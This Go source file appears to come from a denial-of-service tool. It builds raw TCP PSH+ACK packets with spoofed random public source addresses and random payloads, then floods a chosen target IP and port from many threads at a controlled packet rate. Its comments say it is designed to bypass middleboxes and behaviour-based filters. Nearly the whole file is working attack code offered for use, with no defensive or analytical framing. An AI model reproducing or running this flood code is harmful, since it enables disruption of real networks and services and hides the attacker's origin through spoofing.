package main

import (
	"encoding/binary"
	"math/rand"
	"net"
	"runtime"
	"sync"
	"time"
	"context"
)

// Internal variables to allow mocking in tests
var (
	openRawSocketDeepInternal = openRawSocket
	sendtoRawDeepInternal     = sendtoRaw
	closeSocketDeepInternal    = closeSocket
)

func buildDeepInspectionPacketOptimized(srcIP, dstIP net.IP, dstPort uint16, localRand *rand.Rand, buf []byte) []byte {
	srcPort := uint16(localRand.Intn(60000) + 1024)
	
	options := []byte{
		0x02, 0x04, 0x04, 0xb0, // MSS: 1200
		0x03, 0x03, 0x07,       // Window Scale: 7
		0x04, 0x02,             // SACK Permitted
		0x08, 0x0a,             // Timestamps
		0x00, 0x00, 0x00, 0x00, // TSval (placeholder)
		0x00, 0x00, 0x00, 0x00, // TSecr (placeholder)
		0x01, 0x01, 0x01, // 3x NOP
		0x00, // End
	} // 24 bytes (aligned)
	
	binary.BigEndian.PutUint32(options[11:], localRand.Uint32())
	binary.BigEndian.PutUint32(options[15:], localRand.Uint32())

	tcpHeaderLen := 20 + len(options)
	tcp := buf[20 : 20+tcpHeaderLen]
	for i := range tcp { tcp[i] = 0 }

	binary.BigEndian.PutUint16(tcp[0:], srcPort)
	binary.BigEndian.PutUint16(tcp[2:], dstPort)
	binary.BigEndian.PutUint32(tcp[4:], localRand.Uint32()) // Seq
	binary.BigEndian.PutUint32(tcp[8:], localRand.Uint32()) // Ack
	tcp[12] = uint8(tcpHeaderLen/4) << 4
	tcp[13] = 0x18 // PSH + ACK (0x18) is better for 2026 Middlebox bypass
	binary.BigEndian.PutUint16(tcp[14:], uint16(localRand.Intn(65535))) 

	copy(tcp[20:], options)

	// Add 16 bytes of random "Deep Inspection" payload to bypass behavior-based filters
	payload := buf[20+tcpHeaderLen : 20+tcpHeaderLen+16]
	localRand.Read(payload)
	
	fullPacket := buf[20 : 20+tcpHeaderLen+16]

	pseudo := make([]byte, 12+len(fullPacket))
	copy(pseudo[0:4], srcIP.To4())
	copy(pseudo[4:8], dstIP.To4())
	pseudo[9] = IPPROTO_TCP
	binary.BigEndian.PutUint16(pseudo[10:], uint16(len(fullPacket)))
	copy(pseudo[12:], fullPacket)

	// ASSEMBLY ORDER FIX: Write checksum directly into the FINAL buffer
	binary.BigEndian.PutUint16(fullPacket[16:], checksum(pseudo))

	buildIPHeaderLocalOptimized(srcIP, dstIP, IPPROTO_TCP, 20+len(fullPacket), localRand, buf[0:20])
	return buf[:20+len(fullPacket)]
}

func startDeepInspectionFlood(ctx context.Context, opts ContextOpts, targetIP string, targetPort int, threads int, duration time.Duration, pps int) {
	LogInfo("L4", "Starting TCP ACK-Push Deep Inspection Flood on %s:%d for %v with %d threads (PPS: %d)", targetIP, targetPort, duration, threads, pps)

	var wg sync.WaitGroup

	dstIP := net.ParseIP(targetIP).To4()
	if dstIP == nil {
		LogErr("L4", "Invalid target IP: %s", targetIP)
		return
	}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in Deep Inspection: %v", r) } }()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			src := rand.NewSource(time.Now().UnixNano() + int64(threadID))
			localRand := rand.New(src)

			sockFd, err := openRawSocketDeepInternal(IPPROTO_TCP)
			if err != nil {
				return
			}
			defer closeSocketDeepInternal(sockFd)

			tcpBuf := make([]byte, 1500)

			for {
				// High-performance batching
				batchSize := 32
				if pps > 0 {
					if pps < 500 {
						batchSize = 1
					} else if pps < 5000 {
						batchSize = 4
					}
					sleep := time.Second / time.Duration((pps/threads)/batchSize+1)
					time.Sleep(sleep)
				}

				select {
				case <-ctx.Done():
					return
				default:
					for b := 0; b < batchSize; b++ {
						srcIP := randomPublicIPLocal(localRand)
						packet := buildDeepInspectionPacketOptimized(srcIP, dstIP, uint16(targetPort), localRand, tcpBuf)

						if sockFd != InvalidSocket {
							sendtoRawDeepInternal(sockFd, packet, dstIP, targetPort)
							AddStats(1, int64(len(packet)))
						}
					}
				}
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
	LogInfo("L4", "TCP ACK-Push Deep Inspection Flood finished")
}
